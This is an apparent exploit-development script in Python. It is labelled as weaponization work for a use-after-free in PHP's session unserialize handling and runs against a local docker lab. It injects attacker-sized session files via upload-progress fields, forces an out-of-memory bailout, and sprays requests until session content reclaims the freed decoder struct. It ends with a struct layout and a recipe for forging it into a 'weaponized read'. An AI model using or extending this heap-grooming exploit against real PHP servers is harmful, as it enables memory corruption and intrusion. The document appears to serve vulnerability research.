#!/usr/bin/env python3
"""
CVE-2026-109619 weaponization — Rung 1: reclaim observation.

Against the production-shape lab (lab-zendmm-fpm, :18085 — plain ZendMM, no
ASAN): after the producer request frees the decoder bookkeeping
(sizeof(php_unserialize_data) == 8216 bytes — a 3-page ZendMM "large"
allocation whose pages return to the chunk free-map at request shutdown),
which consumer-request allocation reclaims that memory?

The consumer's own session read is the prime candidate: php_session_
initialize() allocates a zend_string of ATTACKER-CONTROLLED size (the
session file we build via upload-progress injection) with
ATTACKER-CONTROLLED content, immediately before the stale-state
consumption. If the session string lands on the freed bookkeeping, the
stale decoder state is overlaid with our bytes — rung 2.

Experiment design:
  A1  build session P (6 MB upload-progress value grows the session key —
      the producer's OOM crossing allocation) and session C (progress value
      sized so the session file is ~8192 bytes => the read allocation
      ~8216 bytes == sizeof(php_unserialize_data); content is 'G' filler —
      if it reclaims the bookkeeping, `last` resolves to 0x4747474747474747,
      unmistakable in the [UAFDBG] WRAP print or as the segfault address).
  A2  producer: memory-pressure session_start() -> OOM at the key
      allocation mid-decode -> INIT publishes d (no DESTROY — bailout
      skipped it) -> request shutdown frees d -> worker survives.
  B   consumer (first request after the producer): multipart with session
      C -> FILE_START -> session read (reclaim candidate) -> stale-branch
      INIT -> wrapper dereference of the freed bookkeeping.

  Parse the [UAFDBG] logs and answer:
    - did the stale state survive? (consumer INIT level==1)
    - did the session read reclaim d? (address arithmetic + WRAP print)
    - what did the stale `last` resolve to? (our filler / old bytes / NULL)

Lab-bound escalation research only (docs/ANALYSIS.md §0.6).

Usage:
  cd lab-zendmm-fpm && docker compose up -d
  python3 verify_109619_reclaim.py --target http://127.0.0.1:18085
"""
import argparse
import re
import socket
import subprocess
import sys
import time
from urllib.parse import urlparse

BOUNDARY = "RECLAIM"
SID_P = "abcdef0123456789abcdef0123456789"
SID_C = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
TARGET_ALLOC = 8216          # sizeof(struct php_unserialize_data) 8.2.x
ZSTR_HDR = 24                 # zend_string header (non-ZEND_DEBUG build)


def http_req(host, port, raw, timeout=120):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(raw)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def upload_inject(host, port, path, sid, filename, progress):
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode("latin-1")
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return http_req(host, port, req)


def get_with_cookie(host, port, path, sid, timeout=90):
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    return http_req(host, port, req, timeout=timeout)


def docker_exec(container, cmd):
    try:
        r = subprocess.run(["docker", "exec", container] + cmd,
                           capture_output=True, text=True, timeout=30)
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return f"<docker exec failed: {e}>"


SCRIPT_START = time.time()


def docker_logs(container):
    try:
        r = subprocess.run(["docker", "logs", "--since",
                            f"{int(time.time() - SCRIPT_START) + 1}s", container],
                           capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr
    except Exception as e:
        return f"<docker logs failed: {e}>"


def parse_uafdbg(blob):
    """Return ordered list of (timestamp, fields-dict) for [UAFDBG] lines."""
    out = []
    for line in blob.splitlines():
        m = re.search(r"\[UAFDBG\] (\w+)\s+(.*)", line)
        if not m:
            continue
        ts = re.match(r"\[([^\]]+)\]", line)
        fields = {"tag": m.group(1), "raw": m.group(2), "ts": ts.group(1) if ts else ""}
        for k, v in re.findall(r"(\w+)=([^\s]+)", m.group(2)):
            fields[k] = v.rstrip('"')
        out.append(fields)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18085")
    ap.add_argument("--container", default="php2shell-zendmm-fpm")
    ap.add_argument("--producer-path", default="/api/producer.php")
    ap.add_argument("--build-path", default="/app/upload.php")
    ap.add_argument("--attempts", type=int, default=12,
                    help="consumer spray attempts (session-C size varies within the 3-page class)")
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 80

    print("[*] CVE-2026-109619 weaponization — Rung 1: reclaim observation")
    print(f"[*] Target: {args.target}  (plain ZendMM, [UAFDBG] instrumented)")
    print()

    # --- A1: build sessions P and C --------------------------------------
    # Session C: size the upload-progress value so the session FILE is
    # ~TARGET_ALLOC bytes => the s_read zend_string allocation
    # (~file + ZSTR_HDR + 1) matches d's 8216-byte size class.
    print("[A1] Building session P (6 MB key) and session C (sized filler)")
    upload_inject(host, port, args.build_path, SID_P, "x|i:1;",
                 progress="A" * (6 * 1024 * 1024))
    filler = "G" * 7840
    upload_inject(host, port, args.build_path, SID_C, "c.bin",
                  progress=filler)
    # Target: session file == 8191 bytes => s_read zend_string allocation
    # == 8191 + 24 (header) + 1 (NUL) == 8216 == sizeof(php_unserialize_data)
    # -> identical ZendMM large-allocation size class (3 pages) as the freed
    # bookkeeping. Iterate with file deletion to avoid duplicate progress
    # keys bloating the file.
    for _ in range(4):
        st = docker_exec(args.container, ["stat", "-c", "%s",
                                           f"/tmp/sessions/sess_{SID_C}"])
        try:
            cur = int(st)
        except ValueError:
            break
        if abs(cur - 8191) <= 8:
            print(f"     session C: file size = {cur} bytes "
                  f"(read alloc == 8216 == d's size class)")
            break
        delta = 8191 - cur
        filler = "G" * (len(filler) + delta)
        docker_exec(args.container, ["rm", "-f", f"/tmp/sessions/sess_{SID_C}"])
        upload_inject(host, port, args.build_path, SID_C, "c.bin",
                      progress=filler)
    for tag, sid in (("P", SID_P), ("C", SID_C)):
        st2 = docker_exec(args.container, ["stat", "-c", "%s",
                                           f"/tmp/sessions/sess_{sid}"])
        print(f"     session {tag}: file size = {st2} bytes")
    print()

    # --- A2: producer ------------------------------------------------------
    print("[A2] Producer: memory-pressure session_start() with session P")
    print("     (OOM at the 6 MB session KEY allocation, mid-decode)")
    t0 = time.time()
    resp = get_with_cookie(host, port, args.producer_path, SID_P)
    dt = time.time() - t0
    text = resp.decode("latin1", "replace") if resp else ""
    print(f"     response: {text.split(chr(13),1)[0][:60] if text else '<none>'}"
          f"   ({dt:.1f}s)")
    fatal = [l for l in text.splitlines() if "Allowed memory size" in l]
    for l in fatal[:1]:
        print(f"     [EVIDENCE] {l.strip()[:170]}")
    if not fatal:
        print("     [!] producer fatal not observed — check the pad and logs")
    print()

    # --- B: consumer SPRAY (first requests after the producer) ------------
    # The stale state persists across consumer requests (level bounces
    # 2<->3 and never returns to 0), and each consumer request performs
    # TWO decodes (FILE_START + END re-initialize), each re-reading the
    # session. Spray consumer requests with slightly different session-C
    # sizes (all in d's 3-page large-allocation class) until the session
    # READ string — whose content is our bytes — lands on the freed
    # bookkeeping. Signature: WRAP last=0x4747... (the 'G' filler).
    print("[B] Consumer spray: each attempt rebuilds session C (~8191 bytes)")
    print("    and fires a multipart consumer request; watching the WRAP")
    print("    prints for the stale bookkeeping resolving to our filler")
    print("    (0x4747...) — the attacker-byte reclaim signature.")
    hit = None
    base_filler = len(filler)
    for attempt in range(1, args.attempts + 1):
        # size jitter: stay inside the 3-page class (file 8169..12263)
        jitter = ((attempt - 1) * 37) % 512
        fill = "G" * (base_filler - jitter)
        docker_exec(args.container, ["rm", "-f", f"/tmp/sessions/sess_{SID_C}"])
        upload_inject(host, port, args.build_path, SID_C, "c.bin",
                      progress=fill)
        resp = upload_inject(host, port, args.build_path, SID_C,
                             "consumer.bin", progress="c")
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") \
            if resp else "<no response / child crashed>"
        time.sleep(0.3)
        events = parse_uafdbg(docker_logs(args.container))
        wraps = [e for e in events if e["tag"] == "WRAP"]
        sesss = [e for e in events if e["tag"] == "SESS"]
        last_wraps = wraps[-2:] if len(wraps) >= 2 else wraps
        info = " | ".join(
            f"last={w.get('last')} used={w.get('used')}" for w in last_wraps)
        sess_info = sesss[-1].get("len") if sesss else "?"
        print(f"    attempt {attempt:2d}: {status[:30]:30s} sess_len={sess_info}"
              f" {info}")
        for w in wraps:
            lv = (w.get("last") or "") + (w.get("used") or "")
            if "474747" in lv:
                hit = (attempt, events, w)
                break
        if hit:
            break
    if hit:
        attempt, events, w = hit
        print()
        print(f"    [RECLAIMED-BY-ATTACKER-BYTES] attempt {attempt}:")
        print(f"        WRAP {w.get('raw')}")
        print("        The stale bookkeeping now resolves to the 'G' filler —")
        print("        the session-content read IS the freed struct's storage.")
    print()

    # --- analysis ---    # --- analysis -----------------------------------------------------------
    events = parse_uafdbg(docker_logs(args.container))
    print(f"[*] [UAFDBG] trace ({len(events)} events):")
    for e in events:
        print(f"     {e['ts']}  {e['raw'][:110]}")
    print()

    # identify events:
    #  - the producer's session-P read is the SESS with a huge len
    #  - the producer's INIT is the one right after it, whose following
    #    event is NOT a DESTROY of the same d (the bailout skipped it)
    producer_d = None
    consumer_sess = None
    consumer_init = None
    consumer_wrap = None
    wrap_reads = []
    for i, e in enumerate(events):
        if e["tag"] == "SESS":
            try:
                if int(e.get("len", "0")) > 1000000:
                    # producer's session P read; the next INIT is the producer's
                    for j in range(i + 1, min(i + 3, len(events))):
                        if events[j]["tag"] == "INIT":
                            nxt = events[j + 1] if j + 1 < len(events) else None
                            if not (nxt and nxt["tag"] == "DESTROY"
                                    and nxt.get("d") == events[j].get("d")):
                                producer_d = events[j].get("d")
                            break
                else:
                    consumer_sess = e
            except ValueError:
                pass
        elif e["tag"] == "INIT":
            # consumer stale INIT: same d as producer's, level>=2
            if producer_d and e.get("d") == producer_d:
                consumer_init = e
        elif e["tag"] == "WRAP":
            consumer_wrap = e
            wrap_reads.append(e)
    print("[*] Analysis:")
    if not producer_d:
        print("    [!] no producer INIT captured — check the producer step")
    if consumer_init:
        stale_d = consumer_init.get("d")
        print(f"    consumer INIT: d={stale_d} level={consumer_init.get('level')}")
        if producer_d and stale_d == producer_d:
            print("    [x] stale state survived: consumer INIT returned the")
            print("        producer's dangling pointer (level=1 branch).")
        elif producer_d:
            print(f"    [!] consumer INIT d={stale_d} != producer d={producer_d}")
    else:
        print("    [!] no consumer INIT (stale branch not taken?)")
    if consumer_sess:
        sess_ptr = int(consumer_sess.get("data", "0x0"), 16)
        sess_len = int(consumer_sess.get("len", "0"))
        alloc_base = sess_ptr - ZSTR_HDR
        print(f"    consumer session read: data={hex(sess_ptr)} len={sess_len}"
              f" => alloc base={hex(alloc_base)}")
        if producer_d:
            d = int(producer_d, 16)
            if alloc_base <= d < alloc_base + TARGET_ALLOC:
                off = d - alloc_base
                print(f"    [RECLAIMED] the session read allocation")
                print(f"        ({hex(alloc_base)}..{hex(alloc_base + TARGET_ALLOC)})")
                print(f"        covers the freed bookkeeping at {producer_d} —")
                print(f"        byte offset of the forged struct inside the session")
                print(f"        content: {off}")
                print(f"        => rung 2 recipe: place the forged")
                print(f"           php_unserialize_data at content offset {off}.")
            else:
                print(f"    [not reclaimed] session alloc base {hex(alloc_base)}"
                      f" does not cover d={producer_d}.")
    if wrap_reads:
        used_seq = [w.get("used") for w in wrap_reads]
        print(f"    consumer WRAP sequence: "
              f"last={[w.get('last') for w in wrap_reads]}")
        print(f"                           used={used_seq}")
        if len(set(used_seq)) > 1:
            print("    [x] the freed bookkeeping CHANGED between reads")
            print("        (used slots differ) — an in-request allocation is")
            print("        reclaiming the freed struct's pages. Reclaim is live;")
            print("        the remaining work is making that allocation carry")
            print("        attacker-controlled bytes (size-class match).")
        for w in wrap_reads:
            if "474747" in (w.get("last") or "") or \
               "474747" in (w.get("used") or ""):
                print("    [RECLAIMED-BY-ATTACKER-BYTES] the stale `last`")
                print("        resolved to 0x4747... — the session content")
                print("        ('G' filler) IS the bookkeeping now. Rung 2 is")
                print("        a content-crafting exercise: replace the filler")
                print("        with the forged php_unserialize_data.")
    print()
    print("[*] Next rung: forge the php_unserialize_data inside the session")
    print("    content (entries.used_slots/data[] pointers into the same")
    print("    string), then R:k -> var_access(k) returns a chosen zval —")
    print("    the weaponized read. See docs/ANALYSIS.md §0.6.1 for the layout:")
    print("    +0 last, +8 first_dtor, +16 last_dtor, +24 allowed_classes,")
    print("    +32 ref_props, +40 cur_depth, +48 max_depth, +56 entries")
    print("    {used_slots, next, data[1018]}.")


if __name__ == "__main__":
    main()
